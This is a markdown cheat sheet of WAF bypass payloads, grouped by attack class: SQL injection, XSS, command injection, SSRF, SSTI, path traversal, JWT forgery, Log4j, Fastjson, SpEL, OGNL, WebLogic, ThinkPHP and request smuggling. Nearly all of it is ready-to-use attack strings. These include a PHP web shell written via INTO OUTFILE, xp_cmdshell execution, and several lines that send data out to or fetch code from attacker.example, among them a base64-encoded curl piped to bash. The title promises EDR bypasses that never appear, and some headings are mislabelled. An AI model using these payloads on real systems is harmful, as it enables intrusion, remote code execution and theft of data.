# WAF / EDR Bypass Techniques

Comprehensive collection of WAF and EDR bypass techniques organized by vulnerability category. Each technique includes the original restriction type and the working bypass payload.

---

## SQL Injection WAF Bypass

### Keyword Filtering Bypass

**Case Variation** - Mix upper/lower case to bypass simple keyword matching:

```sql
' UnIoN SeLeCt 1,database(),3--
' uNiOn SeLeCt 1,user(),3--
```

**Inline Comments** - MySQL-specific comment syntax that bypasses keyword filters:

```sql
' /*!UNION*/ /*!SELECT*/ 1,database(),3-- 
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- 
```

**Double-Write** - When WAF removes keyword once, the remaining letters form the keyword:

```sql
' UNUNIONION SELSELECTECT 1,database(),3--
' UNIunionON SELselectECT 1,2,3--
```

### Space / Whitespace Alternatives

```sql
'/**/UNION/**/SELECT/**/1,database(),3--
'%0aUNION%0aSELECT%0a1,2,3--
'(UNION(SELECT(1),(database()),(3)))--
'UNION%20SELECT%201,2,3--
'UNION+SELECT+1,2,3--
```

### Encoding Bypass

```sql
-- Hex encoding
' UNION SELECT 1,hex(database()),3--
' UNION SELECT 1,unhex(hex(database())),3--

-- Char encoding
' UNION SELECT 1,CHAR(100,97,116,97,98,97,115,101),3--

-- URL encoding
%27%20UNION%20SELECT%201%2Cdatabase()%2C3--

-- Double URL encoding
%2527%2520UNION%2520SELECT%25201%252Cdatabase()%252C3--

-- Null byte injection
' UN%00ION SELECT 1,2,3--
```

### Operator Substitution

```sql
-- Use AND/OR instead of &&
' AND 1=1 UNION SELECT 1,2,3--

-- Use || instead of OR in some contexts
' || 1=1--

-- Comparison operator substitution
' OR 'a' < 'b'--
' OR 1 BETWEEN 1 AND 2--
```

### MySQL-Specific Bypasses

```sql
-- Out-of-band via LOAD_FILE
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.example\\test'))-- 

-- INTO OUTFILE (if MySQL has file write privileges)
' UNION SELECT '<?php system($_GET["cmd"]);?>',2,3 INTO OUTFILE '/var/www/html/shell.php'-- 
```

### MSSQL-Specific Bypasses

```sql
-- Hex conversion for data exfiltration
' UNION SELECT 1,master.dbo.fn_varbintohexstr(CAST(username AS VARBINARY)),3 FROM users--

-- Dynamic SQL execution in stacked queries
'; EXEC('EXEC master..xp_cmdshell ''whoami''')--
'; DECLARE @cmd VARCHAR(255); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd;--

-- OpenRowSet for data exfiltration
'; SELECT * FROM OPENROWSET('SQLOLEDB','server=attacker.example;uid=sa;pwd=test;','SELECT 1')--
```

### Oracle-Specific Bypasses

```sql
-- Oracle function bypass
' UNION SELECT 1,XMLType('<root>'||CHR(60)||'data'||CHR(62)||user||'</data></root>') FROM DUAL--
' UNION SELECT 1,UTL_HTTP.REQUEST('http://attacker.example/'||user),null FROM DUAL--
' UNION SELECT 1,RAWTOHEX(user),null FROM DUAL--

-- Explicit UNION with different column counts
' UNION SELECT 1,2,3 FROM DUAL--
' UNION SELECT 1,2,3,4 FROM DUAL--
```

### PostgreSQL-Specific Bypasses

```sql
-- chr() encoding for strings
' UNION SELECT chr(65)||chr(68)||chr(77)||chr(73)||chr(78),null--

-- CAST conversions
' UNION SELECT CAST(username AS BYTEA),null FROM users--

-- Error-based extraction via CAST
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INTEGER)--
```

### SQLite-Specific Bypasses

```sql
-- CHAR() function
' UNION SELECT CHAR(116,101,115,116),NULL--

-- X prefix hex literal
' UNION SELECT X'746573746461746131',NULL--

-- LIKE/GLOB pattern matching
' AND (SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%user%')--
' AND (SELECT name FROM sqlite_master WHERE type='table' AND name GLOB '*user*')--
```

### NoSQL (MongoDB) Bypass

```json
// Unicode encoding of $ operator
{"username": {"$ne": ""}}
{"username": {"$gt": ""}}

// Regex operators instead of comparison
{"username": {"$regex": "admin"}}

// Type confusion
{"password": {"$ne": null}}
```

### Redis Command Obfuscation

```bash
# Use hex escape sequences to bypass command word detection
redis-cli -h target
> \x43\x4f\x4e\x46\x49\x47 SET dir /var/www/html/
> $(printf 'CONF')$(printf 'IG') SET dbfilename shell.php

# Lua script execution to bypass direct command monitoring
> EVAL "redis.call('config','set','dir','/var/www/html/')" 0
> EVAL "redis.call('config','set','dbfilename','test.php')" 0
> EVAL "redis.call('save')" 0
```

---

## XSS WAF Bypass

### Event Handler Variation

```html
<!-- Standard events often blocked, try alternatives -->
<body onload=alert(1)>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<input autofocus onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<isindex type=image src=1 onerror=alert(1)>
```

### Tag Substitution

```html
<svg/onload=alert(1)>
<svG/onload=alert(1)>
<svg onload=alert(1)//
<svg onload=alert&#x28;1&#x29;>
<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>
```

### Script Tag Obfuscation

```html
<SCRIPT>alert(1)</SCRIPT>
<scr<script>ipt>alert(1)</scr<script>ipt>
<%00script>alert(1)</%00script>
<SCRIPT%20src=http://attacker.example/xss.js></SCRIPT>
```

### Encoding Bypasses

```html
-- Hex entity encoding
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

-- Decimal encoding
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

-- UTF-8 multibyte sequences (older WAFs only)
<scri%00pt>alert(1)</scr%00ipt>

-- Double URL encoding
%253Cscript%253Ealert(1)%253C/script%253E
```

### CSP Bypass via CDN

```html
<!-- Angular + CSP --> 
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<div ng-app ng-csp>
  <div ng-click="$event.view.alert(1)">Click me</div>
</div>

<!-- Prototype.js JSONP bypass -->
<script src="https://www.google.com/recaptcha/api.js?onload=alert(1)"></script>

<!-- Bypass via script loading with JSONP endpoints -->
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
```

---

## RCE / Command Injection WAF Bypass

### Character Encoding

```bash
# Base64 encoding (Linux)
echo -n 'id' | base64
; echo 'aWQ=' | base64 -d | bash

# Hex encoding (Linux)
; $(printf '\x69\x64')

# Octal encoding
; $(printf '\151\144')

# Double URL encoding
%2526%2520whoami%2520%2523
```

### Command Substitution

```bash
# Backtick substitution
`whoami`

# $() substitution variables
$(whoami)

# Process substitution
<(whoami)
>(whoami)
```

### Parameter Injection

```bash
# Newline injection
%0a whoami
%0d%0a whoami

# Environment variable splitting
$9; whoami
;${IFS}whoami

# Path traversal via wildcard
/???/????64 /???/p?ss??
```

### Blind Command Detection

```bash
# Time-based detection
;sleep 5
| ping -c 10 127.0.0.1
|| timeout 5 ping 127.0.0.1

# Out-of-band detection
; curl http://attacker.example/test
| nslookup attacker.example
` wget --post-data=$(whoami) http://attacker.example/log`
```

### WAF-Specific Bypasses (Associative Array)

```bash
# Bypass negation operator detection
| echo "test"; cat /etc/passwd
; `echo "Y3VybCBodHRwOi8vYXR0YWNrZXIuZXhhbXBsZQ==" | base64 -d | bash`
&& return_to_sender=whoami && eval $return_to_sender
```

---

## SSRF WAF Bypass

### IP Address Encoding

```
Decimal:       http://2130706433/
Hex:           http://0x7f000001/
Octal:         http://017700000001/
IPv6:          http://[::1]:80/
Mixed:         http://0x7f.0.0.0x1/
IPv6 mapped:   http://[0:0:0:0:0:ffff:127.0.0.1]/
```

### DNS-Based Bypass

```
http://127.0.0.1.nip.io/
http://127.0.0.1.xip.io/
http://localhost.atoma.cloud/
http://1.2.3.4.rbndr.us/
http://7f000001.7f000001.rbndr.us:8080/admin
```

### Redirect-Based Bypass

```http
-- Use attacker-controlled redirect
?url=http://attacker.example/redirect.php?target=http://127.0.0.1:8080/admin

-- 302 redirect to bypass hostname blocklists
```

### URL Parsing Confusion

```http
?url=http://127.0.0.1:80\@attacker.example/
?url=http://attacker.example#@127.0.0.1/
?url=http://attacker.example:80@127.0.0.1:8080/
?url=http://127.0.0.1#@attacker.example/
?url=@127.0.0.1/
```

### Protocol Abuse

```bash
# Gopher to Redis
gopher://127.0.0.1:6379/_*2%0d%0a$4%0d%0a...

# Dict protocol
dict://127.0.0.1:6379/info

# File protocol  
file:///etc/passwd

# LDAP
ldap://127.0.0.1:389/%0astats
```

### NAT64 IPv6 Bypass

```bash
# When IPv4 is blocked but IPv6 NAT64 works
http://[64:ff9b::c0a8:0101]/  # 192.168.1.1 via NAT64
http://[64:ff9b:1::c000:0201]/ # bypass via NAT64 prefix
```

---

## SSTI WAF Bypass

### Jinja2 Filter Bypass

```jinja
-- Use attr() instead of direct attribute access
{{''|attr('__class__')}}
{{''|attr('__class__')|attr('__mro__')}}
{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(2)|attr('__subclasses__')()}}

-- String concatenation
{{'__cla'~'ss__'}}
{{'__gl'~'ob'~'als__'}}
{{'__built'~'ins__'}}

-- Hex encoding attribute names
{{''['\x5f\x5fclass\x5f\x5f']}}

-- Request object access
{{request|attr('application')|attr('__globals__')}}
{{request.environ}}
```

### Flask/Jinja2 Method Bypass

```jinja
-- Using config object
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

-- Using url_for
{{url_for.__globals__['os'].popen('id').read()}}

-- Using lipsum
{{lipsum.__globals__['os'].popen('id').read()}}

-- Using cycler
{{cycler.__init__.__globals__['os'].popen('id').read()}}
```

---

## File Inclusion WAF Bypass

### Path Traversal Encoding

```http
-- URL encoding
..%2f..%2f..%2fetc/passwd

-- Double URL encoding
..%252f..%252f..%252fetc/passwd

-- Triple URL encoding
..%25252f..%25252f..%25252fetc/passwd

-- UTF-8 overlong encoding (older WAF only)
..%c0%af..%c0%afetc/passwd
..%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

-- 16-bit Unicode (IIS, legacy)
..%c0%af..%c0%afetc/passwd
..%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

-- Backslash (Windows)
..\..\..\windows\system.ini
```

### PHP Wrapper Bypass

```php
-- Double encoding on wrapper
php://filter/convert.base64-encode/resource=index.php
php://%66ilter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=%69ndex.php

-- Compose multiple wrapper filters
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource=config.php
```

---

## JWT WAF Bypass

### Algorithm Confusion

```python
# None algorithm
# Change "alg": "RS256" -> "alg": "none"
# Set signature to empty string
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.

# Key confusion (RS->HS)
# Use the server's public key as HMAC secret
jwt.encode({"sub": "admin"}, public_key, algorithm="HS256")

# Kid SQL injection
{"kid": "' UNION SELECT 'key'--"}
{"kid": "'; SELECT 'anything' as 'secret'--"}
```

### Token Obfuscation

```json
// Remove signature
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.

// Unicode normalize header
{"alg": "RS256", "typ": "JWT"} vs {"alg": "RS256", "typ": "JwT"}

// Extra header fields
{"alg": "RS256", "typ": "JWT", "extra": "padding_data"}
```

---

## Framework-Specific WAF Bypass

### Log4j

```bash
# Nested expression bypass
${${lower:j}ndi:ldap://127.0.0.1:1389/Exploit}
${${upper:j}ndi:${lower:l}dap://attacker.example}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example}

# Protocol variation
${jndi:dns://attacker.example}
${jndi:rmi://attacker.example/exploit}

# Encoding
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.example}
```

### Spring Actuator

```http
-- Path parameter bypass (Spring Framework feature)
;/actuator/env
/actuator;.js/env
/actuator/..;/actuator/env

-- Hex encoding
/%61%63%74%75%61%74%6f%72/env
/actuator/%65%6e%76

-- Path traversal
/random/../actuator/env
/api/v1/../../actuator/heapdump

-- HTTP method override
GET /actuator/env HTTP/1.1
X-HTTP-Method-Override: POST

-- Case variation
/Actuator/Env
/ACTUATOR/ENV
```

### Fastjson

```json
// Unicode encoding of @type
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example/Exploit","autoCommit":true}

// Nested JSON confusion
{"a":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example/Exploit","autoCommit":true}}

// Chained @type for version-specific bypass (1.2.47)
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example/Exploit","autoCommit":true}}

// 1.2.68 expectClass bypass
{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example/Exploit","autoCommit":true}
```

### Spring SpEL

```java
// String concatenation to avoid keyword match
T(java.lang.Run"+"time).getRun"+"time().exec("id")

// Full reflection chain
T(Class).forName("java.lang.Runtime").getMethod("exec",T(String)).invoke(T(Class).forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")

// ScriptEngine eval
T(javax.script.ScriptEngineManager).newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\"id\")")
```

### Struts2 OGNL

```java
// Expression syntax variation
%{#cmd}
${cmd}
@{cmd}

// Unicode encoding
%{#cmd}

// Full reflection chain
#cls=@java.lang.Class@forName("java.lang.Runtime")
#method=#cls.getMethod("getRuntime")
#rt=#method.invoke(null)
#exec=#cls.getMethod("exec",@java.lang.String@class)
#exec.invoke(#rt,"id")
```

### WebLogic

```http
-- Path encoding bypass
/console/css/..;/console.portal
/console/css/%2e%2e/console.portal
/console/css/%252e%252e/console.portal

-- XML variant encoding (CVE-2017-10271)
<!-- UTF-16 encoded payload -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- CDATA wrapped commands -->
<vector version="1.0">
  <void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
      <void index="0"><string><![CDATA[/bin/sh]]></string></void>
      <void index="1"><string><![CDATA[-c]]></string></void>
      <void index="2"><string><![CDATA[id]]></string></void>
    </array>
    <void method="start"/>
  </void>
</vector>

-- Protocol switching (bypass HTTP-only WAF)
# T3 protocol
python3 weblogic_t3_exploit.py -t target:7001 -c "id"

# IIOP protocol
python3 weblogic_iiop_exploit.py -t target:7001 -c "whoami"

# ysoserial via T3
java -jar ysoserial.jar CommonsCollections1 "id" | python3 t3_send.py target 7001
```

### ThinkPHP

```http
-- URL encoding for route values
?s=%2fIndex%2f%5cthink%5capp%2finvokefunction&function=system&vars[0]=id

-- Case variation
?s=/Index/\Think\App/invokefunction&function=system&vars[0]=id

-- Path format variation
?s=index/think/app/invokefunction&function=system&vars[0]=id
?s=/index/\think\App/invokefunction&function=call_user_func_array
```

### Apache Shiro

```bash
# Gadget chain variation
CommonsCollections2  (if CC1 blocked)
CommonsBeanutils1    (alternative)
Jdk7u21              (Java version specific)
JRMPClient           (no dependency chain)

# Custom key brute force
python shiro_exploit.py -t http://target -f keys.txt
```

### Tomcat / JSP Shell

```bash
# Case variation
shell.jSp
shell.JSP
shell.jspx

# Path truncation (older Tomcat)
shell.jsp%00
shell.jsp/  (Windows)

# Alt data stream (NTFS)
shell.jsp::$DATA

# Whitespace injection
shell.jsp%20
```

### Laravel

```http
-- Environment file access path variation
/.env
/.env.example
/.env.local
/.env.production
/..%2f.env
/..%252f.env
```

---

## CSRF WAF Bypass

```html
-- Change request method
POST -> GET

-- Remove Content-Type
<form action="..." method="POST" enctype="text/plain">

-- Custom header (some WAFs allow if header is present)
<form action="..." method="POST">
  <input name="X-Requested-With" value="XMLHttpRequest">
```

---

## HitPod / Cache Poisoning Bypasses

```http
-- Different HTTP methods (WAF may check GET not POST)
POST /cacheable-path HTTP/1.1

-- Unusual headers
X-Forwarded-Host: attacker.example

-- Unusual HTTP version
HTTP/1.0 vs HTTP/1.1

-- Parameter pollution
?param=valid&param=malicious
```

---

## Request Smuggling WAF Bypass

```http
-- CL.TE variation
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 4

1
Z
0

GET /admin HTTP/1.1

-- TE.TE with obfuscated Transfer-Encoding header
Transfer-Encoding: xchunked
Transfer-Encoding: chunked

Transfer-Encoding: [space]chunked
Transfer-Encoding: chunked[tab]

Transfer-Encoding:\tchunked
```
